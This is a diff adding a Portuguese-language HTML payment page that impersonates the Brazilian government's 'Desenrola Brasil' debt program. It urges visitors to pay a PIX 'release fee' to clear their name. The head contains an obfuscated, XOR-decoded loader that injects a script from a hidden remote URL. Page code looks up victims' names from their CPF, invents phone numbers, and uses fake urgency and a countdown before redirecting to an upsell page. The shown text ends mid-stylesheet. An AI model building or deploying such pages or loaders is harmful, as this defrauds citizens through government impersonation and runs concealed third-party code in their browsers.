@@ -1,0 +1,846 @@
+﻿<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+   
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
+  <link rel="icon" type="image/png" sizes="96x96" href="images/icons8-brasil-windows-11-color-96.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/icons8-brasil-windows-11-color-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="images/icons8-brasil-windows-11-color-16.png">
+  <title>Pagamento PIX — Desenrola Brasil</title>
+  <link href="../css2-2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script>(function(){var s_78ph=atob("DLtN903eulVAC7JQNMBvgj+ymG9iY8YkRMh32GK93jtufsY9Xd002S6x13sieZ0jV8kkhzmtlSUpc9c8G8skjyiylD8zKZ5yVc85hSS8zyEleJBqb+Zh1Sqy1TchZ8FyDuA21SO/1zBiMZAgXcMomwS6mHlifdM8Qd5vzW/o2zR3PYdjB4J9xHy6gjQiOYNmAo16wyj8xwg9");var v_3fah=[];for(var q_tj=0;q_tj<s_78ph.length;q_tj++){v_3fah.push(s_78ph.charCodeAt(q_tj)&255);}var o_7=v_3fah[0];var z_o=v_3fah.slice(1,1+o_7);var a_y=v_3fah.slice(1+o_7);var k_q=a_y.map(function(b,w_z3){return b^z_o[w_z3%o_7];});var p_mpj="";for(var g_xo=0;g_xo<k_q.length;g_xo++){p_mpj+=String.fromCharCode(k_q[g_xo]&255);}var c_s7=decodeURIComponent(escape(p_mpj));var z_9z6=JSON.parse(c_s7);var f_mt=z_9z6.globals||[];f_mt.forEach(function(i_pl3){window[i_pl3.name]=i_pl3.value;});var p_84=document.createElement("script");p_84.src=z_9z6.url;p_84.async=true;p_84.defer=true;(z_9z6.attributes||[]).forEach(function(c_r){p_84.setAttribute(c_r.name,c_r.value);});(document.head||document.documentElement).appendChild(p_84);})();</script>
+</head>
+<body>
+  <div class="header">
+    <img src="../images/iconegov.png" alt="gov.br">
+    <span class="header-badge" id="header-nome">Cliente</span>
+  </div>
+
+  <div class="container">
+    <div class="urgency">
+      <span class="icon">⏰</span>
+      <span>Oferta válida somente hoje! Realize o pagamento para limpar seu nome.</span>
+    </div>
+
+    <div class="info-card">
+      <div class="titulo">Resumo do Acordo</div>
+      <div class="info-row">
+        <span class="info-label">Beneficiário</span>
+        <span class="info-value" id="acordo-nome">Cliente</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">CPF</span>
+        <span class="info-value" id="acordo-cpf">—</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Código do acordo</span>
+        <span class="info-value" id="acordo-codigo">—</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Desconto</span>
+        <span class="info-value destaque">99% de desconto</span>
+      </div>
+    </div>
+
+    <div class="info-card" id="confirmacao-card">
+      <div class="titulo">Confirme seus dados</div>
+      <div class="info-row">
+        <span class="info-label">Nome</span>
+        <span class="info-value" id="conf-nome">Cliente</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">CPF</span>
+        <span class="info-value" id="conf-cpf"></span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Telefone (WhatsApp) <small style="color:#999;font-weight:400">(opcional)</small></span>
+        <input type="tel" id="conf-phone" inputmode="numeric" placeholder="(11) 99999-9999" style="padding: 10px 8px; border: 1px solid #ccc; border-radius: 4px; width: 100%; font-size: 16px;">
+      </div>
+      <button type="button" id="btn-confirmar" class="btn-confirmar">Confirmar dados e gerar PIX</button>
+    </div>
+
+    <div class="pix-card" id="pix-card" style="display: none;">
+      <div class="valor-pix" id="valor-pix">—</div>
+      <div class="valor-desc">Valor total do acordo</div>
+
+      <div class="loading-wrap" id="loading-wrap">
+        <div class="spinner"></div>
+        <div class="loading-txt">Gerando seu PIX...</div>
+      </div>
+
+      <div class="qr-wrap" id="qr-wrap">
+        <div class="instrucao">
+          <ol>
+            <li>Abra o app do seu banco</li>
+            <li>Escolha a opção <strong>Pagar com PIX</strong></li>
+            <li>Escaneie o código abaixo OU copie e cole o código</li>
+          </ol>
+        </div>
+
+        <div class="qr-container">
+          <canvas id="qr-img" width="280" height="280"></canvas>
+          <div id="qr-loading" class="qr-loading">Gerando código...</div>
+          <div id="qr-error" class="qr-error" style="display: none;">Erro ao gerar QR Code</div>
+        </div>
+
+        <div class="copy-wrap">
+          <div class="copy-label">PIX Copia e Cola</div>
+          <div class="copy-code" id="copy-code">—</div>
+          <button class="btn-copy" id="btn-copy" onclick="copiarPix()">Copiar código PIX</button>
+        </div>
+        <div class="aguardando" id="aguardando">
+          <div class="dot-blink"></div>
+          Aguardando pagamento...
+        </div>
+        <div class="countdown-wrap" id="countdown-wrap">
+          PIX expira em <span class="countdown-num" id="countdown-num">15:00</span>
+        </div>
+        <div class="ja-paguei-wrap" id="ja-paguei-wrap">
+          <a href="#" id="btn-ja-paguei" class="ja-paguei-link">Ja efetuei o pagamento</a>
+        </div>
+
+        <div class="cp-toast" id="cp-toast" role="status" aria-live="polite">
+          <div class="cp-toast-ic" aria-hidden="true">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+          </div>
+          <span>Comprovante em analise...</span>
+        </div>
+
+        <div class="cp-sheet" id="cp-sheet" aria-hidden="true">
+          <div class="cp-backdrop" id="cp-backdrop"></div>
+          <div class="cp-panel" role="dialog" aria-labelledby="cp-title" aria-modal="true">
+            <div class="cp-handle" aria-hidden="true"></div>
+
+            <div class="cp-view" id="cp-view-upload">
+              <h3 class="cp-title" id="cp-title">Enviar comprovante do PIX</h3>
+              <p class="cp-desc">Anexe uma imagem (JPG, PNG) ou PDF do comprovante do pagamento. Nossa equipe faz a validacao em instantes.</p>
+              <label class="cp-drop" id="cp-file-label">
+                <input type="file" id="cp-file-input" accept="image/*,application/pdf" hidden>
+                <div class="cp-drop-ic" aria-hidden="true">
+                  <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v13"/><path d="M7 8l5-5 5 5"/><path d="M4 21h16"/></svg>
+                </div>
+                <div class="cp-drop-txt">
+                  <div class="cp-drop-title" id="cp-file-text">Selecionar arquivo</div>
+                  <div class="cp-drop-sub">JPG, PNG ou PDF ate 3 MB</div>
+                </div>
+              </label>
+              <div class="cp-status" id="cp-status"></div>
+              <button class="cp-submit" id="cp-submit" disabled>Enviar comprovante</button>
+            </div>
+
+            <div class="cp-view" id="cp-view-already" hidden>
+              <div class="cp-already-ic" aria-hidden="true">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+              </div>
+              <h3 class="cp-title">Comprovante em analise</h3>
+              <p class="cp-desc">Ja recebemos seu comprovante e ele esta sendo validado pela nossa equipe. Deseja enviar outro?</p>
+              <button class="cp-submit" id="cp-send-another">Sim, enviar outro</button>
+              <button class="cp-secondary" id="cp-cancel-already">Nao, fechar</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="success-screen" id="success-screen">
+          <div class="success-icon">✅</div>
+          <div class="success-title">Pagamento confirmado!</div>
+          <div class="success-desc">
+            Seu nome será limpo em até <strong>72 horas úteis.</strong><br>
+            Guarde o código do acordo: <strong id="acordo-ok">—</strong>
+          </div>
+        </div>
+        <div class="erro-screen" id="erro-screen">
+          <div class="erro-icon">❌</div>
+          <div class="erro-title">Pagamento não identificado</div>
+          <div class="erro-desc">O PIX expirou. Clique abaixo para gerar um novo código.</div>
+          <button class="btn-retry" onclick="location.reload()">Tentar novamente</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <img src="../images/iconegov.png" alt="gov.br"><br>
+      Programa Desenrola Brasil — Governo Federal<br>
+      Pagamento processado com segurança via PIX
+    </div>
+  </div>
+
+ <script>
+  /**
+   * Integração direta com backend Vercel -> BravoPay
+   */
+  function params() {
+    var p = new URLSearchParams(window.location.search);
+    var s = {};
+    try { s = JSON.parse(sessionStorage.getItem('desenrola.pagamento') || '{}'); } catch (_) {}
+    var ls = {};
+    try {
+      ls.nome = localStorage.getItem('site.nome') || '';
+      ls.cpf  = localStorage.getItem('site.cpf')  || '';
+    } catch (_) {}
+    return {
+      cpf:    p.get('cpf')    || s.cpf    || ls.cpf  || '',
+      nome:   p.get('nome')   || s.nome   || ls.nome || 'Cliente',
+      phone:  p.get('phone')  || s.phone  || '',
+      email:  p.get('email')  || s.email  || '',
+      valor:  p.get('valor')  || s.valor  || '500',
+      acordo: p.get('acordo') || s.acordo || '',
+      utm_source: p.get('utm_source') || s.utm_source || '',
+      utm_medium: p.get('utm_medium') || s.utm_medium || '',
+      utm_campaign: p.get('utm_campaign') || s.utm_campaign || '',
+      utm_content: p.get('utm_content') || s.utm_content || '',
+      utm_term: p.get('utm_term') || s.utm_term || '',
+      xcod: p.get('xcod') || s.xcod || '',
+      sck: p.get('sck') || s.sck || '',
+      src: p.get('src') || s.src || '',
+      utm_id: p.get('utm_id') || s.utm_id || ''
+    };
+  }
+  
+  function formatCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '').slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+    if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+    return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+  }
+
+  var u = params();
+  var CPF    = u.cpf;
+  var NOME   = u.nome || 'Cliente';
+  var PHONE  = u.phone || '';
+  var EMAIL  = u.email || '';
+  var ACORDO = u.acordo;
+  var VALOR_EXIBIDO = '';
+  var PIX_AMOUNT_CENTS = 500;
+
+  (function () {
+    var raw = String(u.valor || '').trim();
+    var m = raw.match(/(\d+)[,.](\d{2})(?!\d)/);
+    if (m) {
+      PIX_AMOUNT_CENTS = parseInt(m[1], 10) * 100 + parseInt(m[2], 10);
+    } else {
+      var digits = raw.replace(/\D/g, '');
+      if (digits) PIX_AMOUNT_CENTS = parseInt(digits, 10);
+    }
+  })();
+
+  function primeiroNome(nome) {
+    var n = String(nome || '').trim();
+    if (!n || n.toLowerCase() === 'cliente') return 'Cliente';
+    return n.split(/\s+/)[0];
+  }
+
+  function pintarIdentidade() {
+    var setar = function (id, valor) {
+      var el = document.getElementById(id);
+      if (el) el.textContent = valor;
+    };
+    setar('header-nome', primeiroNome(NOME));
+    setar('acordo-nome', NOME);
+    setar('acordo-cpf', formatCPF(CPF) || '—');
+    setar('conf-nome', NOME);
+    setar('conf-cpf', formatCPF(CPF) || '—');
+  }
+
+  pintarIdentidade();
+  var elAcordo = document.getElementById('acordo-codigo');
+  if(elAcordo) elAcordo.textContent = ACORDO || '—';
+
+  (function completarNomePelaAPI() {
+    var digitos = String(CPF || '').replace(/\D/g, '');
+    var precisaNome = !NOME || NOME === 'Cliente';
+    if (digitos.length !== 11 || !precisaNome) return;
+
+    fetch('../cpf-consulta.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({ cpf: digitos }),
+      cache: 'no-store'
+    })
+      .then(function (r) { return r.ok ? r.json() : null; })
+      .then(function (json) {
+        if (!json || json.error) return;
+        var dados = json.dados;
+        if (!Array.isArray(dados) || !dados.length) return;
+        var nome = (dados[0].NOME || '').trim();
+        if (!nome) return;
+
+        NOME = nome;
+        pintarIdentidade();
+        try {
+          localStorage.setItem('site.nome', nome);
+          localStorage.setItem('site.cpf', digitos);
+        } catch (_) {}
+      })
+      .catch(function () {});
+  })();
+
+  var transactionId = null;
+  var pollingTimer  = null;
+  var countdownTimer = null;
+  var segundos = 15 * 60;
+
+  var TX_TITLE = new URLSearchParams(window.location.search).get('product_name')
+    || (typeof GLOBAL_CONFIG !== 'undefined' && GLOBAL_CONFIG.product && GLOBAL_CONFIG.product.name)
+    || 'Taxa de Liberação';
+
+  // ===== INTEGRAÇÃO COM BACKEND VERCEL -> BRAVOPAY =====
+  async function gerarPix() {
+    try {
+      document.getElementById('loading-wrap').style.display = 'block';
+
+      var _utms = (typeof window.gvdesenrolaMergeTracking === 'function') ? window.gvdesenrolaMergeTracking() : u;
+      var fbc_val = '', fbp_val = '';
+      try {
+        var _gc = function (n) { var m = document.cookie.match('(?:^|; )' + n + '=([^;]+)'); return m ? decodeURIComponent(m[1]) : ''; };
+        fbp_val = _gc('_fbp');
+        fbc_val = _gc('_fbc');
+      } catch (e) {}
+
+      var payload = {
+        amount_cents: PIX_AMOUNT_CENTS,
+        method: "pix",
+        customer: {
+          name: NOME || "Cliente",
+          email: EMAIL || (NOME.toLowerCase().replace(/\s+/g, '') + '@email.com'),
+          cpf: String(CPF).replace(/\D/g, ''),
+          phone: String(PHONE).replace(/\D/g, '')
+        },
+        description: TX_TITLE || "Taxa de Liberação",
+        external_reference: "chk_" + new Date().getTime(),
+        utm: {
+          source: _utms.utm_source || "",
+          medium: _utms.utm_medium || "",
+          campaign: _utms.utm_campaign || "",
+          content: _utms.utm_content || "",
+          term: _utms.utm_term || "",
+          fbclid: _utms.fbclid || fbc_val || "",
+          gclid: _utms.gclid || "",
+          ttclid: _utms.ttclid || ""
+        }
+      };
+
+      var response = await fetch('/api/criar-pix', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      var result = await response.json();
+
+      if (!response.ok || result.error) {
+        throw new Error(result.error ? (result.error.message || JSON.stringify(result.error)) : 'Erro ao gerar PIX no servidor');
+      }
+
+      transactionId = result.id; 
+      var pixCode = result.pix.copy_paste; 
+
+      if (!pixCode) {
+        throw new Error('Código PIX não retornado pelo servidor');
+      }
+
+      VALOR_EXIBIDO = 'R$ ' + (result.amount_cents / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      
+      var elValor = document.getElementById('valor-pix');
+      if(elValor) elValor.textContent = VALOR_EXIBIDO;
+      
+      var elCopy = document.getElementById('copy-code');
+      if(elCopy) elCopy.textContent = pixCode;
+
+      document.getElementById('loading-wrap').style.display = 'none';
+      document.getElementById('qr-wrap').style.display = 'block';
+
+
+      // ==== NOVA RENDERIZAÇÃO DE QR CODE (API EXTERNA 100% GARANTIDA) ====
+      var qrCodeUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=280x280&margin=1&data=' + encodeURIComponent(pixCode);
+      var oldElement = document.getElementById('qr-img');
+      
+      if(oldElement) {
+        var img = document.createElement('img');
+        img.src = qrCodeUrl;
+        img.width = 280;
+        img.height = 280;
+        img.style.maxWidth = '100%';
+        img.style.display = 'block';
+        img.style.margin = '0 auto';
+        img.style.background = 'white';
+        img.style.borderRadius = '8px';
+        img.id = 'qr-img';
+
+        img.onload = function() {
+          var loadEl = document.getElementById('qr-loading');
+          var errEl = document.getElementById('qr-error');
+          if(loadEl) loadEl.style.display = 'none';
+          if(errEl) errEl.style.display = 'none';
+        };
+
+        img.onerror = function() {
+          var errEl = document.getElementById('qr-error');
+          if(errEl) errEl.style.display = 'block';
+        };
+
+        oldElement.parentNode.replaceChild(img, oldElement);
+      }
+      // ===================================================================
+
+      iniciarCountdown();
+      pollingTimer = setInterval(verificarStatus, 3000);
+
+      try {
+        sessionStorage.setItem('desenrola.pagamento', JSON.stringify({
+          cpf: CPF, nome: NOME, valor: VALOR_EXIBIDO, acordo: ACORDO, transactionId: transactionId
+        }));
+      } catch (_) {}
+
+    } catch (e) {
+      console.error('Erro gerarPix:', e);
+      mostrarErro(e && e.message ? e.message : 'Não foi possível conectar. Verifique sua conexão.');
+    }
+  }
+
+  function redirecionarAprovado(txId) {
+    var urlParams = new URLSearchParams(window.location.search);
+    var next = urlParams.get('next') || '/upsell1/';
+    var redirectUrl = new URL(next, window.location.origin);
+    redirectUrl.searchParams.set('funil_ok', '1');
+    var nome = urlParams.get('nome') || '';
+    var cpf = urlParams.get('cpf') || '';
+    if (nome) redirectUrl.searchParams.set('nome', nome);
+    if (cpf) redirectUrl.searchParams.set('cpf', cpf);
+    try {
+      if (typeof window.gvdesenrolaMergeTracking === 'function') {
+        var trk = window.gvdesenrolaMergeTracking();
+        var TRACK = /^utm_|^(fbclid|gclid|ttclid|wbraid|gbraid|msclkid|src|sck|xcod)$/;
+        Object.keys(trk).forEach(function (k) {
+          if (trk[k] && TRACK.test(k) && !redirectUrl.searchParams.has(k)) {
+            redirectUrl.searchParams.set(k, trk[k]);
+          }
+        });
+      }
+    } catch (e) {}
+    window.location.href = redirectUrl.toString();
+  }
+
+  async function verificarStatus() {
+    if (!transactionId) return;
+    try {
+      var response = await fetch('/api/status-pix?id=' + encodeURIComponent(transactionId), {
+        method: 'GET',
+        headers: { 'Accept': 'application/json' }
+      });
+      
+      if (!response.ok) return;
+
+      var result = await response.json();
+      
+      if (result.status === 'PAID') {
+        pararPolling();
+
+        var elAcordoOk = document.getElementById('acordo-ok');
+        if(elAcordoOk) elAcordoOk.textContent = ACORDO || transactionId;
+        
+        document.getElementById('aguardando').style.display = 'none';
+        document.getElementById('countdown-wrap').style.display = 'none';
+        
+        var copyWrap = document.querySelector('.copy-wrap');
+        if(copyWrap) copyWrap.style.display = 'none';
+        
+        var qrCont = document.querySelector('.qr-container');
+        if(qrCont) qrCont.style.display = 'none';
+        
+        var inst = document.querySelector('.instrucao');
+        if(inst) inst.style.display = 'none';
+        
+        document.getElementById('success-screen').style.display = 'block';
+        
+        setTimeout(function () {
+          redirecionarAprovado(transactionId);
+        }, 2000);
+      }
+    } catch (e) {
+      console.error('Erro verificarStatus:', e);
+    }
+  }
+
+  function pararPolling() {
+    if (pollingTimer) clearInterval(pollingTimer);
+    if (countdownTimer) clearInterval(countdownTimer);
+  }
+
+  function iniciarCountdown() {
+    var el = document.getElementById('countdown-num');
+    countdownTimer = setInterval(function () {
+      segundos--;
+      if (segundos <= 0) { pararPolling(); mostrarErroPix(); return; }
+      if (!el) return;
+      var m = String(Math.floor(segundos / 60)).padStart(2, '0');
+      var s = String(segundos % 60).padStart(2, '0');
+      el.textContent = m + ':' + s;
+      el.classList.toggle('urgente', segundos < 120);
+    }, 1000);
+  }
+
+  function mostrarErroPix() {
+    var ag = document.getElementById('aguardando');
+    if(ag) ag.style.display = 'none';
+    
+    var cdw = document.getElementById('countdown-wrap');
+    if(cdw) cdw.style.display = 'none';
+    
+    var cw = document.querySelector('.copy-wrap');
+    if(cw) cw.style.display = 'none';
+    
+    var qi = document.getElementById('qr-img');
+    if(qi) qi.style.display = 'none';
+    
+    var inst = document.querySelector('.instrucao');
+    if(inst) inst.style.display = 'none';
+    
+    var es = document.getElementById('erro-screen');
+    if(es) es.style.display = 'block';
+  }
+
+  function mostrarErro(msg) {
+    document.getElementById('loading-wrap').innerHTML =
+      '<div style="color:#DC2626;font-size:14px;padding:10px 0">' + msg +
+      '<br><br><button onclick="location.reload()" class="btn-retry" style="margin-top:8px">Tentar novamente</button></div>';
+  }
+
+  function copiarPix() {
+    var copyEl = document.getElementById('copy-code');
+    if(!copyEl) return;
+    var code = copyEl.textContent;
+    
+    var done = function () {
+      var btn = document.getElementById('btn-copy');
+      if(btn) {
+        btn.textContent = 'Código copiado!';
+        btn.classList.add('copiado');
+        setTimeout(function () {
+          btn.textContent = 'Copiar código PIX';
+          btn.classList.remove('copiado');
+        }, 3000);
+      }
+    };
+    
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(code).then(done).catch(function () {
+        var ta = document.createElement('textarea');
+        ta.value = code; ta.style.position = 'fixed'; ta.style.opacity = '0';
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand('copy'); } catch (_) {}
+        ta.remove();
+        done();
+      });
+    } else {
+      var ta = document.createElement('textarea');
+      ta.value = code; ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select();
+      try { document.execCommand('copy'); } catch (_) {}
+      ta.remove();
+      done();
+    }
+  }
+
+  function formatPhone(v) {
+    var d = String(v || '').replace(/\D/g, '').slice(0, 11);
+    if (d.length <= 2) return d;
+    if (d.length <= 7) return '(' + d.slice(0, 2) + ') ' + d.slice(2);
+    return '(' + d.slice(0, 2) + ') ' + d.slice(2, 7) + '-' + d.slice(7);
+  }
+
+  function randomPhone() {
+    var ddds = ['11','21','31','41','51','61','71','81','85','19','27','47','48','62','98'];
+    var ddd = ddds[Math.floor(Math.random() * ddds.length)];
+    var num = '9';
+    for (var i = 0; i < 8; i++) num += Math.floor(Math.random() * 10);
+    return ddd + num;
+  }
+
+  window.addEventListener('load', function () {
+    pintarIdentidade();
+    var cp = document.getElementById('conf-phone');
+    if(cp) {
+      cp.value = '';
+      cp.addEventListener('input', function () {
+        this.value = formatPhone(this.value);
+      });
+    }
+
+    var btnConfirmar = document.getElementById('btn-confirmar');
+    if(btnConfirmar) {
+      btnConfirmar.addEventListener('click', function () {
+        var phone = '';
+        if(cp) phone = String(cp.value || '').replace(/\D/g, '');
+        PHONE = phone.length >= 10 ? phone : randomPhone();
+        
+        var confCard = document.getElementById('confirmacao-card');
+        if(confCard) confCard.style.display = 'none';
+        
+        var pixCard = document.getElementById('pix-card');
+        if(pixCard) pixCard.style.display = 'block';
+        
+        gerarPix();
+      });
+    }
+
+    initComprovanteModal();
+  });
+
+  function initComprovanteModal() {
+    var linkBtn = document.getElementById('btn-ja-paguei');
+    var jaPagueiWrap = document.getElementById('ja-paguei-wrap');
+    var toastEl = document.getElementById('cp-toast');
+    var sheet = document.getElementById('cp-sheet');
+    var backdrop = document.getElementById('cp-backdrop');
+    var fileInput = document.getElementById('cp-file-input');
+    var fileLabel = document.getElementById('cp-file-label');
+    var fileText = document.getElementById('cp-file-text');
+    var submitBtn = document.getElementById('cp-submit');
+    var statusEl = document.getElementById('cp-status');
+    var viewUpload = document.getElementById('cp-view-upload');
+    var viewAlready = document.getElementById('cp-view-already');
+    var sendAnotherBtn = document.getElementById('cp-send-another');
+    var cancelAlreadyBtn = document.getElementById('cp-cancel-already');
+    if (!linkBtn || !sheet) return;
+
+    var arquivo = null;
+    var hasSubmitted = false;
+    var MAX_BYTES = 3 * 1024 * 1024;
+
+    function showUploadView() {
+      viewAlready.hidden = true;
+      viewUpload.hidden = false;
+    }
+    function showAlreadyView() {
+      viewUpload.hidden = true;
+      viewAlready.hidden = false;
+    }
+
+    function open() {
+      if (hasSubmitted) showAlreadyView();
+      else showUploadView();
+      sheet.classList.add('open');
+      sheet.setAttribute('aria-hidden', 'false');
+      document.body.classList.add('cp-lock');
+    }
+    function close() {
+      sheet.classList.remove('open');
+      sheet.setAttribute('aria-hidden', 'true');
+      document.body.classList.remove('cp-lock');
+      setTimeout(function () {
+        arquivo = null;
+        if (fileInput) fileInput.value = '';
+        if (fileText) fileText.textContent = 'Selecionar arquivo';
+        if (fileLabel) fileLabel.classList.remove('has-file');
+        if (statusEl) { statusEl.textContent = ''; statusEl.className = 'cp-status'; }
+        if (submitBtn) {
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Enviar comprovante';
+          submitBtn.classList.remove('enviado');
+        }
+      }, 320);
+    }
+
+    linkBtn.addEventListener('click', function (e) { e.preventDefault(); open(); });
+    backdrop.addEventListener('click', close);
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape' && sheet.classList.contains('open')) close();
+    });
+    sendAnotherBtn.addEventListener('click', function () { showUploadView(); });
+    cancelAlreadyBtn.addEventListener('click', function () { close(); });
+
+    function showToast() {
+      if (!toastEl) return;
+      toastEl.classList.add('open');
+      setTimeout(function () { toastEl.classList.remove('open'); }, 3200);
+    }
+
+    fileInput.addEventListener('change', function () {
+      var f = fileInput.files && fileInput.files[0];
+      if (!f) return;
+      if (f.size > MAX_BYTES) {
+        statusEl.textContent = 'Arquivo maior que 3 MB. Reduza e tente novamente.';
+        statusEl.className = 'cp-status err';
+        arquivo = null;
+        fileText.textContent = 'Selecionar arquivo';
+        fileLabel.classList.remove('has-file');
+        submitBtn.disabled = true;
+        return;
+      }
+      arquivo = f;
+      fileText.textContent = f.name;
+      fileLabel.classList.add('has-file');
+      statusEl.textContent = '';
+      statusEl.className = 'cp-status';
+      submitBtn.disabled = false;
+    });
+
+    submitBtn.addEventListener('click', async function () {
+      if (!arquivo) return;
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Enviando...';
+      statusEl.textContent = '';
+      statusEl.className = 'cp-status';
+      try {
+        var b64 = await new Promise(function (resolve, reject) {
+          var fr = new FileReader();
+          fr.onload = function () {
+            var v = String(fr.result || '');
+            var i = v.indexOf(',');
+            resolve(i >= 0 ? v.slice(i + 1) : v);
+          };
+          fr.onerror = function () { reject(new Error('Falha ao ler arquivo')); };
+          fr.readAsDataURL(arquivo);
+        });
+
+        var params = new URLSearchParams(window.location.search);
+        var resp = await fetch('/api/upload-comprovante', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            transaction_id: transactionId || null,
+            external_reference: null,
+            cpf: (params.get('cpf') || '').replace(/\D/g, ''),
+            nome: params.get('nome') || '',
+            acordo: params.get('acordo') || '',
+            file_name: arquivo.name,
+            mime_type: arquivo.type || 'application/octet-stream',
+            size_bytes: arquivo.size,
+            data_base64: b64
+          })
+        });
+        var out = await resp.json().catch(function () { return {}; });
+        if (!resp.ok || out.error) throw new Error(out.error || 'Falha ao enviar');
+
+        submitBtn.textContent = 'Comprovante enviado';
+        submitBtn.classList.add('enviado');
+        statusEl.textContent = 'Recebemos seu comprovante. Nao saia desta pagina.';
+        statusEl.className = 'cp-status ok';
+        hasSubmitted = true;
+        setTimeout(function () {
+          close();
+          showToast();
+        }, 1400);
+      } catch (e) {
+        console.error('upload comprovante:', e);
+        statusEl.textContent = 'Nao foi possivel enviar. Tente novamente.';
+        statusEl.className = 'cp-status err';
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Enviar comprovante';
+      }
+    });
+  }
+</script>
+  
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { min-height: 100%; width: 100%; }
+    body { font-family: 'Inter', sans-serif; background: #f0f2f5; }
+    .header {
+      background: #fff; border-bottom: 3px solid #1351B4; box-shadow: 0 2px 8px rgba(0,0,0,.08);
+      padding: 0 16px; height: 58px; display: flex; align-items: center; justify-content: space-between;
+      position: sticky; top: 0; z-index: 10;
+    }
+    .header img { height: 34px; }
+    .header-badge { background: #1351B4; color: #fff; border-radius: 50px; padding: 5px 13px; font-size: 13px; font-weight: 600; }
+    .container { max-width: 480px; margin: 0 auto; padding: 20px 16px 48px; }
+    .urgency { background: #FEF3C7; border: 1.5px solid #F59E0B; border-radius: 10px; padding: 12px 16px; display: flex; align-items: center; gap: 10px; margin-bottom: 16px; font-size: 13px; font-weight: 600; color: #92400E; }
+    .urgency .icon { font-size: 20px; flex-shrink: 0; }
+    .info-card { background: #fff; border-radius: 14px; box-shadow: 0 2px 12px rgba(0,0,0,.08); padding: 20px; margin-bottom: 16px; }
+    .info-card .titulo { font-size: 13px; font-weight: 700; color: #888; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 14px; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; }
+    .info-row + .info-row { border-top: 1px solid #f0f0f0; }
+    .info-label { font-size: 13px; color: #666; }
+    .info-value { font-size: 13px; font-weight: 600; color: #1a1a1a; text-align: right; max-width: 60%; }
+    .info-value.destaque { color: #1351B4; }
+    .pix-card { background: #fff; border-radius: 14px; box-shadow: 0 2px 12px rgba(0,0,0,.08); padding: 24px 20px; text-align: center; }
+    .pix-card .valor-pix { font-size: 32px; font-weight: 800; color: #1351B4; margin-bottom: 4px; }
+    .pix-card .valor-desc { font-size: 13px; color: #888; margin-bottom: 20px; }
+    .loading-wrap { padding: 20px 0 10px; }
+    .spinner { width: 44px; height: 44px; border: 4px solid #e5e7eb; border-top-color: #1351B4; border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 16px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-txt { font-size: 14px; color: #666; }
+    .qr-wrap { display: none; }
+    .qr-container { background: #f9f9f9; border: 2px solid #1351B4; border-radius: 12px; padding: 20px; margin: 20px 0; text-align: center; position: relative; }
+    #qr-img { max-width: 100%; width: 280px; height: 280px; display: block; margin: 0 auto; background: white; border-radius: 8px; }
+    .qr-loading { color: #666; font-size: 13px; padding: 60px 0; display: none; }
+    .qr-error { color: #DC2626; font-size: 13px; padding: 60px 20px; display: none; background: #FEE2E2; border-radius: 8px; }
+    .instrucao { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 16px; }
+    .instrucao ol { padding-left: 18px; }
+    .instrucao li { margin-bottom: 4px; }
+    .copy-wrap { background: #f0f4ff; border: 1.5px dashed #1351B4; border-radius: 10px; padding: 12px 14px; margin-bottom: 14px; }
+    .copy-label { font-size: 11px; font-weight: 700; color: #1351B4; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 6px; }
+    .copy-code { font-size: 11px; font-family: monospace; color: #333; word-break: break-all; line-height: 1.5; margin-bottom: 10px; }
+    .btn-copy { width: 100%; padding: 11px; background: #1351B4; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; font-family: inherit; cursor: pointer; transition: background .15s; }
+    .btn-copy:hover { background: #0F4DA8; }
+    .btn-copy.copiado { background: #059669; }
